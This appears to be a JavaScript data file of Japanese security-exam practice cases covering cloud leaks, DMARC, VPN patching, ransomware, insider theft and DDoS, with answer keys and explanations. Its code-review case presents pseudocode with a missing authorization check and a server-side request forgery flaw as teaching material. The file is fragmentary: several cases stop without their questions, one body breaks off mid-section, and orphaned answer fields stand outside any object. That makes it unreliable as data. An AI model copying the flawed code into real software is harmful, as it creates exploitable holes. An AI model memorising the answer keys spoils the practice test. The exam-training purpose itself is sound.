"全社のパスワードを毎週変更させる",
"プロキシサーバの台数を増やす",
"PCの壁紙に注意喚起の画像を設定する"],a:0,
e:"添付文書のマクロは典型的な感染経路であり、既定無効化と必要時のみの限定許可が有効。訓練や無害化との組合せも本試験の記述で問われる。"}]},

{id:"rc3", theme:"cloud", title:"SaaSの設定不備による情報漏えい", minutes:12,
body:`<p>C社は、従業員数150名のコンサルティング会社であり、資料の保管と社外との受渡しにオンラインストレージサービス(以下、サービスSという)を利用している。サービスSでは、ファイルごとに共有リンクを発行でき、共有リンクの公開範囲は「リンクを知っている全員」又は「指定した利用者のみ」から選択できる。C社での既定値は「リンクを知っている全員」であった。</p>
<p>ある日、C社の顧客名簿ファイルが検索エンジン経由で第三者に閲覧されていたことが判明した。調査の結果、社員が顧客名簿の共有リンクを誤って社外の掲示板に貼り付けており、<u>①公開範囲の設定と相まって第三者が閲覧できる状態</u>になっていたことが分かった。</p>
<p>C社の情報システム部は、サービスSの【 d 】を確認し、当該リンクへのアクセス元と閲覧日時を特定して影響範囲を把握した。</p>
<p>再発防止策の検討において、情報システム部のHさんは次の3点を提案した。</p>
<p>(1) 共有リンクの公開範囲の既定値を「指定した利用者のみ」に変更し、「リンクを知っている全員」の使用は承認制とする。<br>(2) サービスSへのログインを、社内の【 e 】と連携したシングルサインオンに統一し、多要素認証を必須とする。<br>(3) <u>②退職者のアカウントを人事手続と連動して速やかに無効化する</u>運用を整備する。</p>`,
questions:[
{id:"rc3q1",theme:"cloud",q:"下線①のような漏えいを設定面で防ぐ考え方として、最も適切なものはどれか。",
c:["既定値を最も制限的な設定にし、広い公開が必要な場合だけ例外として許可する",
"全ファイルの共有リンクを常時発行しておく",
"公開範囲の設定を各社員の自由裁量に任せる",
"ファイル名を英数字のみに統一する"],a:0,
e:"セキュアデフォルト(既定で安全側)の考え方。クラウドの漏えい事故は設定不備が最多原因であり、既定値の見直しと例外の承認制が実効的な対策となる。"},
{id:"rc3q2",theme:"cloud",q:"本文中の【 d 】に入れる字句として、最も適切なものはどれか。",
c:["監査ログ(アクセスログ)","利用料金の明細","サービスレベル合意書","ヘルプページ"],a:0,
e:"影響範囲の特定には、誰が(どこから)いつ何にアクセスしたかを記録した監査ログが必須。SaaS選定時にログ取得可否を確認することも論点になる。"},
{id:"rc3q3",theme:"cloud",q:"本文中の【 e 】に入れる字句として、最も適切なものはどれか。",
c:["IdP(アイデンティティプロバイダ)","DHCPサーバ","NTPサーバ","DNSキャッシュサーバ"],a:0,
e:"SSOはIdPが認証を担い、SAMLやOIDCでサービスS(SP)に認証結果を連携する構成。ID管理の一元化により、多要素認証の徹底や退職時の即時無効化が容易になる。"},
{id:"rc3q4",theme:"cloud",q:"下線②を怠った場合に想定されるリスクとして、最も適切なものはどれか。",
c:["退職者が退職後も社外から顧客情報にアクセスできる状態が残る",
"在職中の社員がログインできなくなる",
"サービスSの利用料金が自動的に増額される",
"共有リンクの有効期限が短くなる"],a:0,
e:"SaaSは社外からアクセスできるため、アカウントの無効化漏れは元従業員による情報持出しの典型的な原因となる。入退社プロセスとの連動が対策の要点。"},
{id:"rc3q5",theme:"cloud",q:"SaaS利用における責任共有の考え方として、適切なものはどれか。",
c:["サービス基盤の運用はSaaS事業者の責任だが、公開範囲などの設定とアカウント管理は利用者側の責任である",
"SaaSを利用すればセキュリティの責任は全て事業者に移転する",
"データの内容についても事業者が全責任を負う",
"利用者はパスワード管理の責任も負わない"],a:0,
e:"SaaSでも、データの取扱い、アクセス権・共有設定、ID管理は利用者の責任範囲。本事例の漏えいも設定と利用方法に起因しており、事業者側の障害ではない。"}]},

{id:"rc4", theme:"mail", title:"なりすましメールへの対策", minutes:12,
body:`<p>D社は、機械部品の製造会社である。ある日、経理部に、取引先E社の担当者を名乗る差出人から「振込先口座を変更した」という内容のメールが届いた。経理部員が電話でE社に確認したところ、E社はそのようなメールを送っておらず、<u>①ビジネスメール詐欺(BEC)の試み</u>であることが判明した。</p>
<p>D社の情報システム部が当該メールのヘッダを調査した結果は次のとおりであった。</p>
<table class="p-table"><caption>表3 メールヘッダの調査結果(抜粋)</caption>
<tr><th>項目</th><th>内容</th></tr>
<tr><td>ヘッダFrom</td><td>tanaka@e-sha.example(E社の正規ドメイン)</td></tr>
<tr><td>エンベロープFROM</td><td>info@attacker-domain.example</td></tr>
<tr><td>SPF検証結果</td><td>pass(attacker-domain.exampleとして検証)</td></tr></table>
<p>情報システム部のJさんは、「SPFの検証は【 f 】のドメインに対して行われるため、攻撃者が自分のドメインで正しくSPFを設定していれば、検証結果はpassになる。利用者に表示されるヘッダFromの詐称を検知するには、SPFやDKIMの検証結果とヘッダFromのドメインの一致(アライメント)を確認する【 g 】の導入が必要だ」と説明した。</p>
<p>D社は、自社ドメインがなりすましに悪用されることを防ぐため、【 g 】のポリシーを段階的に強化し、最終的に認証失敗メールの受信拒否を受信側に求める設定とすることにした。あわせて、<u>②振込先変更などの重要な依頼は、メール以外の手段で相手に事実確認を行う</u>業務ルールを定めた。</p>`,
questions:[
{id:"rc4q1",theme:"mail",q:"本文中の【 f 】に入れる字句はどれか。",
c:["エンベロープFROM(メール配送で使われる送信者アドレス)","ヘッダFrom(メールソフトに表示される差出人)","宛先(To)","件名(Subject)"],a:0,
e:"SPFは配送上の送信者(エンベロープFROM)のドメインと送信元IPアドレスを照合する。表示上の差出人(ヘッダFrom)は検証対象外という弱点が、本事例のすり抜けの原因。"},
{id:"rc4q2",theme:"mail",q:"本文中の【 g 】に入れる字句はどれか。",
c:["DMARC","DNSSEC","S/MIME","HSTS"],a:0,
e:"DMARCはSPF/DKIMの結果とヘッダFromのアライメントを検証し、失敗時の取扱い(none/quarantine/reject)をドメイン所有者が宣言できる仕組み。"},
{id:"rc4q3",theme:"mail",q:"DMARCのポリシーを段階的に強化する際の適切な順序はどれか。",
c:["none で影響をレポートで確認した後、quarantine を経て reject に移行する",
"最初から reject とし、問題があれば none に戻す",
"quarantine から none へ緩和していく",
"ポリシーは一度設定したら変更しない"],a:0,
e:"正規メールが認証失敗している場合に備え、まずnoneでレポートを収集して送信経路を整備し、隔離(quarantine)→拒否(reject)へ段階的に強化するのが実務の定石。"},
{id:"rc4q4",theme:"mail",q:"下線②の業務ルールが有効な理由として、最も適切なものはどれか。",
c:["BECは正規のやり取りを巧妙に装うため技術的検知をすり抜けることがあり、別経路での事実確認が最後の砦になるから",
"電話はメールより通信速度が速いから",
"メールの誤送信を完全に防止できるから",
"取引先のパスワードを確認できるから"],a:0,
e:"実在の担当者や過去のやり取りを装うBECは、送信ドメイン認証を通過する場合すらある。金銭に関わる依頼の別経路確認と複数人承認という業務プロセス側の対策が本質的に有効。"},
{id:"rc4q5",theme:"mail",q:"下線①のほか、攻撃者がD社の取引先の実際のメール文面を引用してくる場合に疑うべき事態はどれか。",
c:["取引先のメールアカウントが乗っ取られ、過去のメールが窃取されている可能性",
"D社のWebサイトが改ざんされている可能性",
"DNSサーバが停止している可能性",
"プロキシサーバの設定誤りの可能性"],a:0,
e:"実際のやり取りへの返信を装う手口は、いずれかの側のメールボックスが侵害されている兆候。取引先への連絡と、自社側の調査(不正ログイン・転送設定の有無)の両方が必要になる。"}]},

{id:"rc5", theme:"mgmt", title:"VPN装置の脆弱性への対応", minutes:12,
body:`<p>E社は、従業員数600名の物流会社であり、テレワーク用にVPN装置Vを利用している。ある日、装置Vの製品に認証を回避できる脆弱性(CVSS基本値9.8)が公表され、セキュリティ機関から<u>①この脆弱性の悪用が既に観測されている</u>との注意喚起が出た。修正済みファームウェアは公開されたが、適用には装置の再起動が必要であり、業務時間中の適用は物流システムの利用に影響する。</p>
<p>E社のセキュリティ担当Kさんは、リスクを評価した上で次の対応方針を立てた。</p>
<p>(1) 適用は当日深夜の保守時間帯に行う。<br>(2) 適用までの間、【 h 】として、装置Vの管理画面へのインターネットからのアクセスを遮断し、VPN接続のログ監視を強化する。<br>(3) 適用後、公表されている侵害の痕跡(IoC)と照合し、<u>②脆弱性公表前から既に侵入されていなかったか</u>を確認する。</p>
<p>また、対応の過程で、資産管理台帳に載っていない予備のVPN装置が検証用ネットワークに接続されたままであることが見つかった。Kさんは「<u>③台帳で把握していない機器の脆弱性には対応できない</u>」として、IT資産管理の徹底を再発防止策に加えた。</p>`,
questions:[
{id:"rc5q1",theme:"mgmt",q:"下線①の情報が対応の優先順位判断において重要である理由はどれか。",
c:["実際に悪用が観測されている脆弱性は攻撃を受ける可能性が高く、CVSS値だけの評価よりも対応の緊急度を高く見積もるべきだから",
"悪用が観測されると CVSS 基本値が自動的に下がるから",
"悪用が観測された脆弱性はパッチが不要になるから",
"悪用の観測は海外のみの事象であり日本では関係ないから"],a:0,
e:"CVSS基本値は脆弱性固有の深刻度で、実際の悪用状況は含まない。悪用観測(KEV掲載など)は攻撃の切迫度を示すため、優先順位を引き上げる決定的な要素になる。"},
{id:"rc5q2",theme:"mgmt",q:"本文中の【 h 】に入れる字句として、最も適切なものはどれか。",
c:["パッチ適用までの暫定的な緩和策","恒久対策","リスクの受容","脆弱性の隠蔽"],a:0,
e:"即時適用できない場合は、攻撃経路の遮断・監視強化などの緩和策で時間を稼ぎ、計画的に恒久対策(パッチ適用)を行う。この二段構えは記述式でも頻出の考え方。"},
{id:"rc5q3",theme:"mgmt",q:"下線②の確認が必要な理由として、最も適切なものはどれか。",
c:["パッチを適用しても、適用前に侵入した攻撃者が設置したバックドアやアカウントは除去されないから",
"パッチ適用によって過去のログが全て消えるから",
"IoCはパッチ適用後にしか照合できないから",
"侵入があった場合はパッチの適用が不要になるから"],a:0,
e:"脆弱性の悪用が先行していた場合、修正後も攻撃者の足場(バックドア、窃取された認証情報)が残る。パッチ適用と侵害有無の調査は別の作業として両方必要。"},
{id:"rc5q4",theme:"mgmt",q:"下線③に関連して、管理外の機器が引き起こす典型的なリスクはどれか。",
c:["脆弱性が放置されたままインターネットや内部ネットワークに接続され、攻撃の侵入口となる",
"減価償却費が増加する",
"機器の保証期間が延長される",
"通信速度が自動的に向上する"],a:0,
e:"台帳と実態の差異(野良機器・退役漏れ)は攻撃者から見える攻撃対象領域を広げる。資産の把握は脆弱性管理の前提であり、ASMの考え方にもつながる。"},
{id:"rc5q5",theme:"mgmt",q:"本事例のようなインターネット公開機器の脆弱性対応を平時から迅速にするための準備として、最も適切なものはどれか。",
c:["公開機器の一覧と担当者を整備し、脆弱性情報の収集から適用判断までの手順と判断基準をあらかじめ定めておく",
"脆弱性情報の収集を停止して混乱を防ぐ",
"全ての公開機器を匿名で運用する",
"パッチは年度末にまとめて適用すると決めておく"],a:0,
e:"資産一覧・情報収集体制・トリアージ基準(悪用状況、公開有無、業務影響)・適用手順を平時に整備しておくことが、公表から適用までの時間を縮める。R7春の2問はまさにこの運用を問うた。"}]}
];

{id:"fl1", theme:"code", title:"Webアプリケーションプログラムの開発", minutes:35, long:true,
body:`<p>P社は、従業員数400名の家電量販チェーンである。P社は、店舗在庫の確認と取り置き予約ができる会員向けWebサイト(以下、サイトYという)を自社開発しており、開発課のQ課長、開発担当のRさん及びSさんが担当している。</p>
<p>サイトYの構成を図1に示す。</p>
<table class="p-table"><caption>図1 サイトYの構成(抜粋)</caption>
<tr><th>要素</th><th>概要</th></tr>
<tr><td>Webサーバ</td><td>DMZに設置。TLSで会員のブラウザと通信する。</td></tr>
<tr><td>APサーバ</td><td>内部セグメントに設置。サイトYの業務ロジックを実行する。</td></tr>
<tr><td>DBサーバ</td><td>内部セグメントに設置。会員情報、在庫情報、予約情報を保持する。</td></tr>
<tr><td>画像取得機能</td><td>仕入先が指定したURLから商品画像を取得し、サイトYに掲載する。APサーバが実行する。</td></tr>
</table>
<p>今回、P社は会員向けの新機能として、他の会員に予約状況を共有する機能を追加することにした。開発に先立ち、Q課長は外部のセキュリティ専門家Tさんを招いてコードレビューを実施した。</p>
<h4>〔予約詳細参照機能のレビュー〕</h4>
<p>Rさんが実装した予約詳細参照機能のソースコードの一部を図2に示す。会員は、マイページの一覧から予約を選択すると、GETパラメタreserve_idを指定して本機能を呼び出す。</p>
<pre class="code">// 図2 予約詳細参照機能(抜粋)
1: function showReserve(request) {
2:   if (session.member_id == null) {
3:     return redirect("/login");
4:   }
5:   rid = request.getParam("reserve_id");
6:   sql = "SELECT * FROM reserve WHERE reserve_id = ?";
7:   row = db.query(sql, rid);
8:   return render("reserve_detail", row);
9: }</pre>
<p>Tさんは、図2について「6行目及び7行目は【 a 】を用いているので、SQLインジェクションのおそれはない。しかし、<u>①この機能には別の重大な脆弱性がある</u>」と指摘した。Tさんは、修正案として6行目のSQL文に条件を追加し、あわせて<u>②取得結果が0件の場合の処理</u>を実装するよう助言した。</p>
<h4>〔画像取得機能のレビュー〕</h4>
<p>Sさんが実装した画像取得機能のソースコードの一部を図3に示す。仕入先の担当者が管理画面に入力したURLを、APサーバが取得しに行く。</p>
<pre class="code">// 図3 画像取得機能(抜粋)
1: function fetchImage(request) {
2:   url = request.getParam("image_url");
3:   if (!url.startsWith("http://") && !url.startsWith("https://")) {
4:     return error("URLの形式が不正です");
5:   }
6:   content = http.get(url);   // APサーバから取得
7:   return save(content);
8: }</pre>
<p>Tさんは「図3は【 b 】と呼ばれる脆弱性がある。APサーバは内部セグメントに設置されているので、<u>③攻撃者は本来外部から到達できない資源にアクセスできるおそれがある</u>」と指摘した。P社はAPサーバをクラウドの仮想サーバへ移行する計画があり、Tさんは移行後は特に注意が必要だと述べた。</p>
<p>対策として、Tさんは次の3点を挙げた。</p>
<p>(1) 取得先として許可するホスト名を【 c 】方式で管理し、これに合致しないURLは拒否する。<br>(2) 名前解決の結果が私用IPアドレス(プライベートIPアドレス)やループバックアドレスの場合は取得しない。<br>(3) <u>④APサーバから外部への通信を、専用のプロキシ経由に限定する</u>。</p>
<h4>〔ログイン機能のレビュー〕</h4>
<p>サイトYのログイン機能では、会員が入力した利用者IDとパスワードをDBサーバの会員テーブルと照合している。会員テーブルのパスワード列には、パスワードをSHA-256で1回ハッシュ化した値が格納されていた。Tさんは「<u>⑤現在の格納方式には問題がある</u>」と指摘し、改善を求めた。</p>
<p>また、ログイン失敗が同一の利用者IDに対して連続した場合にアカウントをロックする機能は実装されていたが、Tさんは「多数の利用者IDに対して、よく使われるパスワードを1つずつ試す【 d 】という攻撃には、この機能では対抗できない」と述べた。</p>
<p>レビュー結果を受け、Q課長は指摘事項の修正計画を策定し、修正後に再度レビューを実施することにした。</p>`,

{id:"fl2", theme:"incident", title:"ランサムウェア感染とインシデント対応", minutes:35, long:true,
body:`<p>U社は、従業員数1,200名の食品加工会社であり、本社と3か所の工場を持つ。U社の情報システム部にはCSIRTが設置されており、部長のV氏がCSIRTの責任者を務めている。</p>
<p>U社のネットワークは、本社と各工場を広域イーサネットで接続し、インターネットへの接続は本社に集約している。従業員のPCからインターネットへのアクセスはプロキシサーバを経由する。テレワーク用にVPN装置Wを本社に設置している。</p>
<h4>〔インシデントの発生〕</h4>
<p>ある年の6月15日(月)8時30分、複数の従業員から「ファイルサーバのファイルが開けず、見慣れない拡張子に変わっている」との連絡が情報システム部に相次いだ。ファイルサーバには身代金を要求する文書ファイルが置かれていた。V氏はCSIRTを招集し、対応を開始した。</p>
<p>初動対応として、CSIRTは次の措置を実施した。</p>
<p>(1) ファイルサーバを含む被害が確認されたサーバを、ネットワークから切り離した。<br>(2) VPN装置Wの利用を一時停止した。<br>(3) <u>①被害の有無にかかわらず、全社に対して業務システムの利用停止を指示した</u>。</p>
<p>調査の過程で判明した事象を、時系列に整理した結果を表1に示す。</p>
<table class="p-table"><caption>表1 判明した事象の時系列</caption>
<tr><th>日時</th><th>事象</th><th>判明した経緯</th></tr>
<tr><td>5月20日 02:14</td><td>VPN装置Wに対し、海外のIPアドレスから利用者IDaccount_hの認証成功</td><td>VPN装置Wのログ</td></tr>
<tr><td>5月20日 02:31</td><td>account_hのアカウントで、保守用サーバへのリモートデスクトップ接続が成功</td><td>認証サーバのログ</td></tr>
<tr><td>5月21日〜6月10日</td><td>保守用サーバから複数のサーバへの認証成功が断続的に発生</td><td>認証サーバのログ</td></tr>
<tr><td>6月12日 22:07</td><td>保守用サーバから外部のオンラインストレージへ、約80GBのデータ送信</td><td>プロキシサーバのログ</td></tr>
<tr><td>6月15日 01:40</td><td>ファイルサーバ上のファイルの暗号化が開始</td><td>ファイルサーバのイベントログ</td></tr>
</table>
<p>利用者IDaccount_hは、3月に退職した保守委託先の要員に貸与していたものであり、<u>②退職の連絡を受けたにもかかわらず無効化されていなかった</u>。また、VPN装置Wの認証は利用者IDとパスワードだけで行われていた。</p>
<h4>〔被害範囲の特定〕</h4>
<p>CSIRTのX氏は、表1の5月21日以降の横展開の範囲を特定するため、【 a 】のログを重点的に調査し、account_hによる認証が成功した機器を洗い出した。あわせて、暗号化の実行に用いられたマルウェアの検体をセキュリティ専門会社に提出し、得られたファイルのハッシュ値や通信先の情報を用いてEDRで全端末を横断的に検索した。</p>
<p>6月12日のデータ送信について、X氏は「<u>③今回の攻撃は、暗号化による業務停止だけでなく、別の被害も想定して対応する必要がある</u>」とV氏に報告した。</p>
<h4>〔復旧〕</h4>

{id:"fl3", theme:"cloud", title:"クラウド移行に伴うセキュリティ設計", minutes:30, long:true,
body:`<p>Z社は、従業員数250名のソフトウェア受託開発会社である。Z社は、オンプレミスで運用してきた社内システムと開発環境を、クラウドサービスAに移行することにした。移行プロジェクトの責任者は情報システム課のB課長、担当はCさんである。</p>
<h4>〔移行の概要〕</h4>
<p>移行対象と移行後の形態を表1に示す。</p>
<table class="p-table"><caption>表1 移行対象と移行後の形態</caption>
<tr><th>対象</th><th>移行後の形態</th></tr>
<tr><td>グループウェア</td><td>SaaSを利用する</td></tr>
<tr><td>業務システム</td><td>クラウドサービスAの仮想サーバ(IaaS)上で稼働させる</td></tr>
<tr><td>顧客提供物の保管</td><td>クラウドサービスAのオブジェクトストレージを利用する</td></tr>
<tr><td>ビルド・テスト</td><td>クラウドサービスAのCI/CDサービスを利用する</td></tr>
</table>
<p>Cさんは、移行に当たり<u>①責任共有モデル</u>を整理した。その結果、業務システムについては、仮想化基盤より下位の層はクラウド事業者の責任であるが、【 a 】から上位の層はZ社の責任であることを確認した。</p>
<h4>〔アクセス管理の設計〕</h4>
<p>Cさんは、クラウドサービスAの管理者権限について次の方針を定めた。</p>
<p>(1) 日常の運用は必要最小限の権限を付与した利用者で行い、強い権限は必要なときだけ一時的に引き受ける。<br>(2) 管理コンソールへのログインには多要素認証を必須とする。<br>(3) 業務システムの仮想サーバがオブジェクトストレージにアクセスする際は、長期の固定的なアクセスキーを配置せず、<u>②仮想サーバに割り当てたロールによる一時的な認証情報を用いる</u>。<br>(4) クラウドサービスAの操作ログを取得し、<u>③運用担当者が変更や削除をできない別の領域に保管する</u>。</p>
<h4>〔オブジェクトストレージの設計〕</h4>
<p>顧客提供物には顧客の個人データが含まれる場合があるため、Cさんは、オブジェクトストレージについて、公開設定を禁止する組織全体の設定を有効にした上で、保存データの暗号化を有効にした。さらに、設定内容が意図せず変更されていないかを継続的に点検するため、【 b 】と呼ばれる種類のツールの導入を検討した。</p>
<h4>〔CI/CDの設計〕</h4>
<p>Z社では、ソースコードをリポジトリで管理し、コミットを契機にCI/CDサービスがビルドとテストを実行し、本番環境へ配布する。Cさんは、現在の運用に次の問題があることを確認した。</p>
<p>(1) 本番環境への配布に用いる認証情報が、リポジトリ内の設定ファイルに平文で記載されている。<br>(2) 外部の公開リポジトリから取得したライブラリを、版を指定せずに毎回最新版で取得している。<br>(3) 本番環境への配布を、開発者の誰もが実行できる。</p>
<p>Cさんは、(1)について<u>④専用の仕組みで管理し、実行時に受け渡す方式</u>へ変更することとした。(2)については、依存関係を記録した【 c 】を整備して構成部品を把握し、版を固定した上で既知の脆弱性を継続的に確認する運用に改めることにした。(3)については、承認を経た場合にのみ配布を実行できるようにした。</p>
<p>B課長は、これらの設計をまとめた上で、移行後に第三者による設定レビューを受けることを決定した。</p>`,

e:"IaaSでは、物理設備・ネットワーク・仮想化基盤までが事業者の責任、ゲストOSとその上のミドルウェア、アプリケーション、データ、アクセス管理が利用者の責任になる。SaaSでは境界が上方へ移る点も整理しておきたい。"},

{id:"fl3q5",theme:"cloud",q:"本文中の【 b 】に入れる字句として、最も適切なものはどれか。",
c:["CSPM(クラウドセキュリティ態勢管理)","WAF","IDS","負荷分散装置"],a:0,
e:"クラウドの設定不備は漏えいの最大要因であり、設定を継続的に評価して逸脱を検出する仕組みが有効。人手の点検では変更の見落としが避けられない。"},
{id:"fl3q6",theme:"cloud",q:"下線④に該当する対策として、最も適切なものはどれか。",
c:["シークレット管理サービスに保管し、実行時にCI/CDジョブへ環境変数などで受け渡す",
"設定ファイルを暗号化した上で、復号鍵も同じリポジトリに保存する","認証情報を短い文字列に変更する","リポジトリを非公開設定にすれば平文のままでよい"],a:0,
e:"リポジトリは複製・共有されやすく、非公開設定でも権限を持つ全員が閲覧でき、履歴にも残る。専用の管理機構で保護し、コミット時のシークレット検出も併用するのが基本。復号鍵を同居させるのは意味がない。"},

c:["SBOM(ソフトウェア部品表)","SLA","BCP","RFP"],a:0,
e:"広範囲に影響する脆弱性が公表された際、自社製品や社内システムのどこで当該部品が使われているかを即座に特定できるかが初動を左右する。SBOMは構成部品と版を記録し、影響調査を迅速化する。"},

e:"DNSやNTPなど、問合せより応答が大きくなるプロトコルが悪用され、少ない帯域で大きな攻撃量を生み出せる(増幅)。踏み台にされないよう、公開サーバの設定見直し(オープンリゾルバの解消など)が必要。",

{id:"th06",theme:"threat",q:"DNSランダムサブドメイン攻撃の根本対策が難しい理由として、最も適切なものはどれか。",

e:"存在しないサブドメインへの問合せが権威サーバに転送され続けて高負荷になる。正規の問合せと判別できないため、レート制限やDDoS対策サービスなど緩和策の組合せで対応する。",

{id:"th07",theme:"threat",q:"SYNフラッド攻撃の説明として、最も適切なものはどれか。",

CASES_FULL.push(
{id:"fl4", theme:"threat", title:"内部不正による情報漏えいと再発防止", minutes:30, long:true,
body:`<p>D社は、従業員数900名の産業機械メーカーである。D社は、製品の設計データと取引先情報を基幹システムで管理しており、営業部、設計部及び情報システム部がそれぞれの業務に応じて利用している。</p>
<h4>〔事案の発覚〕</h4>
<p>ある年の9月、D社の取引先から「D社の設計情報とみられる資料を、競合他社であるE社の営業担当者が提示してきた」との連絡が入った。D社は調査委員会を設置し、情報システム部のFさんが技術的な調査を担当した。</p>
<p>調査の結果、7月末に設計部を退職しE社へ転職したG氏が、退職前に大量の設計データを取得していたことが判明した。判明した事象を表1に示す。</p>
<table class="p-table"><caption>表1 判明した事象</caption>
<tr><th>時期</th><th>事象</th><th>判明した経緯</th></tr>
<tr><td>6月10日</td><td>G氏が退職の意思を上長に伝えた</td><td>人事部への聞取り</td></tr>
<tr><td>7月14日〜25日</td><td>G氏のアカウントで、担当外の製品を含む設計データを深夜に断続的に閲覧・ダウンロード</td><td>基幹システムの操作ログ</td></tr>
<tr><td>7月20日</td><td>G氏の業務用PCに私物のUSBメモリが接続された記録</td><td>資産管理ソフトのログ</td></tr>
<tr><td>7月31日</td><td>G氏が退職。秘密保持に関する誓約書に署名</td><td>人事部の記録</td></tr>
<tr><td>8月〜9月</td><td>G氏のアカウントが有効なまま残存</td><td>アカウント管理台帳</td></tr>
</table>
<p>Fさんは、表1について「<u>①退職の意思表示から退職までの期間に、権限の見直しが行われていなかった</u>」ことと、「<u>②退職後もアカウントが無効化されていなかった</u>」ことの2点を、管理上の問題として指摘した。</p>
<h4>〔権限とログの調査〕</h4>
<p>G氏には、担当製品以外の設計データへのアクセス権も付与されていた。これは、数年前に一時的な応援業務のために付与された権限が、<u>③業務終了後も見直されずに残っていた</u>ためであった。Fさんは、この状態が【 a 】の原則に反していると指摘した。</p>
<p>また、設計部では複数の担当者が同一の共用IDを用いて図面管理システムを利用している運用が残っていた。Fさんは「<u>④共用IDの運用には、内部不正の調査上の重大な問題がある</u>」と述べ、廃止を求めた。</p>
<p>操作ログについては、基幹システムでは取得されていたが、監査は行われておらず、7月の深夜の大量ダウンロードは事案発覚まで誰にも気付かれていなかった。</p>
<h4>〔法的な検討〕</h4>
<p>調査委員会は、持ち出された設計データがD社の営業秘密に該当するかを検討した。営業秘密として法的な保護を受けるには、秘密として管理されていること、事業活動に有用であること、公然と知られていないことの3要件を満たす必要がある。このうち【 b 】の要件について、D社は情報の格付けと管理措置が不十分であった可能性が指摘された。</p>
<p>また、G氏が持ち出した情報を、E社が不正に取得されたものと知りながら使用していた場合、<u>⑤E社も法的な責任を問われる可能性がある</u>との見解が示された。</p>
<h4>〔再発防止策〕</h4>
<p>D社は次の再発防止策をまとめた。</p>
<p>(1) 情報資産を重要度に応じて格付けし、管理者を定める。<br>(2) 利用者IDとアクセス権の登録・変更・削除の手順を定め、異動・離職時に確実に反映する。あわせて定期的な棚卸しを行う。<br>(3) 共用IDを廃止し、利用者を特定できる運用に改める。<br>(4) 操作ログについて、<u>⑥大量のダウンロード等をしきい値で検知して通知する仕組み</u>を導入し、定期的な監査を行う。<br>(5) 外部記録媒体の利用を原則禁止とし、業務上必要な場合は申請・承認制とする。<br>(6) 監視を実施していることを規程に明記し、従業員へ周知する。</p>`,
questions:[

"操作ログの保存期間が短くなる"],a:0,
e:"離職後も有効なアカウントは、内部不正の攻撃手口として明示されている典型例。人事情報と連動した無効化の手続が整備されていないと、こうした残存が生じる。"},
{id:"fl4q3",theme:"threat",q:"本文中の【 a 】に入れる字句として、最も適切なものはどれか。",
c:["最小権限","責任共有","多層防御","フェールセーフ"],a:0,
e:"業務上必要な範囲に限って権限を与える原則。一時的に付与した権限を業務終了後に回収する運用まで含めて機能する。定期的な棚卸しが実効性を担保する。"},
{id:"fl4q4",theme:"threat",q:"下線③のような状態を防ぐための運用として、最も適切なものはどれか。",
c:["権限の付与時に有効期限や見直し時期を定め、定期的に棚卸しを行う",
"一度付与した権限は変更しない運用とする",
"権限の付与記録を残さない",
"全社員に同一の権限を付与する"],a:0,
e:"権限は付与時点では適切でも、業務や組織の変化により過剰になっていく。付与のプロセスだけでなく、回収と定期的な妥当性確認までを手続化する必要がある。"},
{id:"fl4q5",theme:"threat",q:"下線④の問題として、最も適切なものはどれか。",
c:["操作ログを追跡しても誰が実行したのかを特定できず、責任追跡性が確保できない",
"共用IDはパスワードを設定できない",
"共用IDでは操作ログが一切取得されない",
"共用IDは有効期限を設定できない"],a:0,
e:"内部不正の調査では「いつ誰が何をしたか」の特定が核心であり、共用IDはこれを不可能にする。抑止の面でも、特定できないという認識が不正の心理的障壁を下げてしまう。"},
{id:"fl4q6",theme:"threat",q:"本文中の【 b 】に入れる字句として、最も適切なものはどれか。",
c:["秘密管理性","有用性","非公知性","新規性"],a:0,
e:"営業秘密として保護されるには、秘密として管理されている実態が必要になる。格付けの表示、アクセス制限、持出しの制限といった措置が伴っていなければ、この要件を満たさないと判断されるおそれがある。"},
{id:"fl4q7",theme:"threat",q:"下線⑤について、E社に問われ得る法令上の責任の根拠として、最も適切なものはどれか。",
c:["不正競争防止法における営業秘密の不正取得・使用等",
"電気通信事業法における通信の秘密の侵害",
"労働基準法における就業規則違反",
"独占禁止法における不当廉売"],a:0,
e:"不正に取得された営業秘密と知りながら使用・開示する行為も不正競争に該当し、刑事罰の対象となる場合がある。転職者を受け入れる側の組織にも、持込み情報の確認という管理責任が生じる。"},
{id:"fl4q8",theme:"threat",q:"下線⑥の仕組みが有効である理由として、最も適切なものはどれか。",
c:["通常の業務と異なる規模や時間帯の操作を早期に検知でき、事後の発覚まで気付かない事態を避けられる",
"ログの保存容量を削減できる",
"ダウンロードの速度が向上する",
"アクセス権の設定が不要になる"],a:0,
e:"本事案ではログは取得されていたが監査されておらず、深夜の大量ダウンロードが放置された。取得と監視は別物であり、しきい値検知やアラートによって「気付ける」状態にすることが要点になる。"},
{id:"fl4q9",theme:"threat",q:"再発防止策(6)の「監視の実施を規程に明記し周知する」ことの主な狙いはどれか。",
c:["監視されているという認識により不正を思いとどまらせる抑止効果を期待するとともに、監視の正当性を明確にする",
"従業員のプライバシーを完全に不要とするため",
"監視の対象範囲を曖昧にするため",
"ログの取得件数を増やすため"],a:0,
e:"内部不正対策では発見と同等に抑止が重視される。同時に、無断の監視は労務やプライバシーの問題を生むため、規程での明示と周知が正当性を担保する。"},
{id:"fl4q10",theme:"threat",q:"外部記録媒体の利用を原則禁止とし、申請・承認制とする対策の位置づけとして、最も適切なものはどれか。",
c:["情報の持出し経路を限定し、利用実態を記録に残すことで抑止と追跡を可能にする",
"媒体の購入費用を削減するための施策である",
"データの暗号化を不要にするための施策である",
"ネットワークの帯域を確保するための施策である"],a:0,
e:"USBメモリは持出しの典型的な経路であり、経路そのものを絞ることが有効。あわせてメール、クラウドストレージ、印刷など他の経路への対策も併用しなければ、抜け道が残る。"}]}
);

CASES.push(
{id:"rc6", theme:"threat", title:"Webサイトへの大規模DDoS攻撃", minutes:12,
body:`<p>H社は、旅客輸送事業を営む企業であり、Webサイトで予約受付を行っている。ある年の12月26日9時頃から、H社のWebサイトの応答が著しく遅くなり、予約の受付ができない状態となった。</p>
<p>調査の結果、社内外を接続するネットワーク機器に対して、外部から大量のデータが送り付けられていることが判明した。攻撃の通信は、OSI基本参照モデルのレイヤ3/4のパケットと、レイヤ7のHTTPリクエストが混在する<u>①混成型のDDoS攻撃</u>であった。</p>
<p>H社のCSIRTは、攻撃を受けているネットワーク機器をシステムから切り離す処置を行い、約6時間後にシステムを復旧させた。この障害により、H社の輸送を利用していた他社の配送業務にも影響が及んだ。</p>
<p>復旧後の検討で、CSIRTのJさんは次の点を報告した。</p>
